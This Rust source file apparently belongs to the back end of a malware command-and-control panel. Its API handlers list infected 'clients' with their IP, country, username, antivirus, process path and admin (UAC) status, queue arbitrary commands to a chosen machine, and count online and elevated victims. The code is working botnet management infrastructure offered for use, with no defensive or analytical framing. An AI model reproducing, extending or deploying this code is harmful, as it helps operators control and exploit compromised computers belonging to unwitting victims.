use crate::web_paths::*;

#[post("/api/clients_list")]
pub async fn api_clients_list(req_body: String) -> impl Responder {

    let json = match serde_json::from_str(&req_body) {
        Ok(r) => r,
        Err(_) => return resp_badrequest()
    };

    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = obtain_connection().await;
    
        let mut client_selection = match connection.query_iter(r"SELECT * FROM clients").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(client_selection_sql) Unable to fetch client list");
                return resp_servererror();
            }, 
        };

        let mut json_clients_list = json!({});
      
        for row in client_selection.collect::<Row<>>().await.unwrap() {

            let is_online = is_client_online(&mut connection, &value_to_str(&row, 0)).await;

            json_clients_list[value_to_str(&row, 0)] = json!(
                {
                    "version": value_to_u64(&row, 1),
                    "uac": value_to_bool(&row, 2),
                    "ip": value_to_str(&row, 3),
                    "country": value_to_str(&row, 4),
                    "username": value_to_str(&row, 5),
                    "guid": value_to_str(&row, 6),
                    "cpu": value_to_str(&row, 7),
                    "gpu": value_to_str(&row, 8),
                    "ram":value_to_u64(&row, 9),
                    "antivirus": value_to_str(&row, 10),
                    "path": value_to_str(&row, 11),
                    "pid": value_to_u64(&row, 12),
                    "last_seen":value_to_u64(&row, 13),
                    "first_seen": value_to_u64(&row, 14),
                    "online": is_online,
                    "build_id": value_to_str(&row, 17),
                }
            );            
        }


        return resp_ok(json_clients_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/clients_list without authentication."));
        return resp_unauthorised();
    }
}



#[post("/api/issue_command")]
pub async fn api_issue_command(req_body: String) -> impl Responder {
        let json = match serde_json::from_str(&req_body) {
        Ok(r) => r,
        Err(_) => return resp_badrequest()
    };
    
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = obtain_connection().await;

        let parsed_cmd_args = &parse_storage_write(key_to_string(&json, "cmd_args").as_bytes());
        let client_id = &key_to_string(&json, "client_id");
        let cmd_type = key_to_string(&json, "cmd_type");

        let command_id = task_client(
            &mut connection, 
            &client_id, 
            "N/A", 
            &parsed_cmd_args,
            &cmd_type,
         ).await;
        fprint("success", &format!("Command executed on {} with type {}", 
           client_id, cmd_type.yellow()
        ));

        return resp_ok(command_id);
    } else {
        fprint("failure", &format!("Request was sent to /api/issue without authentication."));
        return resp_unauthorised();

    }
}



#[post("/api/statistics")]
pub async fn statistics(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        
        let mut connection = obtain_connection().await;
        let mut connection2 = obtain_connection().await;

        let mut command_selection = match connection.query_iter(r"SELECT command_id FROM commands").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(command_selection_sql) Unable to get a list of commands.");
                return resp_servererror();
            }, 
        };

        
        let mut client_selection = match connection2.query_iter(r"SELECT last_seen,uac,first_seen,client_id FROM clients").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(client_selection_sql) Unable to get a list of clients.");
                return resp_servererror();
            }, 
        };

        // Client shit
        let mut online_clients_amount :u64 = 0;
        let mut offline_clients_amount: u64 = 0;
        let mut uac_clients_amount: u64 = 0;
        let mut last_new_client: u64 = 0;

        // Command Shit
        let mut active_command_amount: u64 = 0;

        let selected_commands = command_selection.collect::<Row<>>().await;
        for _ in selected_commands.unwrap() { active_command_amount += 1; }

        let selected_clients = client_selection.collect::<Row<>>().await;
        for row in selected_clients.unwrap() {
            
            if value_to_u64(&row, 2) > last_new_client {
                last_new_client = value_to_u64(&row, 2);
            }
            
            if value_to_bool(&row, 1) {
                uac_clients_amount += 1;
            }

            if !is_client_online(&mut connection, &value_to_str(&row, 3)).await {
                offline_clients_amount += 1;
            } else {
                online_clients_amount += 1;
            }
        }

        let json_to_return = json!({
            "offline_clients": offline_clients_amount,
            "online_clients": online_clients_amount,
            "total_clients": offline_clients_amount + online_clients_amount,
            "uac_clients": uac_clients_amount,
            "last_new_client": last_new_client,
            "active_commands": active_command_amount,
        });

        return resp_ok(json_to_return.to_string());
        
    } else {
        fprint("failure", &format!("Request was sent to /api/statistics without authentication."));
        return resp_unauthorised();
    }
}